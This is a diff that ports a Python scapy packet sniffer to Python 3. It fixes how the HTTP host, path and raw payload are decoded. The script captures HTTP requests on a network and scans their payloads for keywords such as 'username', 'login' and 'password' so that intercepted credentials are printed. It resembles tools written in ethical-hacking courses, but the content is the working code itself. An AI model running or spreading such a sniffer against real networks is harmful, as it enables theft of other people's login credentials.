@@ -1,4 +1,4 @@
-#! /usr/bin/env python
+#! /usr/bin/env python3
 import scapy.all as scapy
 from scapy.layers import http
 
@@ -19,10 +19,10 @@ def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         # url will be saved in url and then it will be printed so you can see url + later credentials
         url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-        print("[+] HTTP request " + url)
+        print("[+] HTTP request " + url.decode())
 
         if packet.haslayer(scapy.Raw):
-            load = packet[scapy.Raw].load
+            load = str(packet[scapy.Raw].load)
             # list keywords which will be go through words which can contain interesting stuff and then it will be printed
             keywords = ["username", "user", "login", "password", "pass"]
             for keyword in keywords:
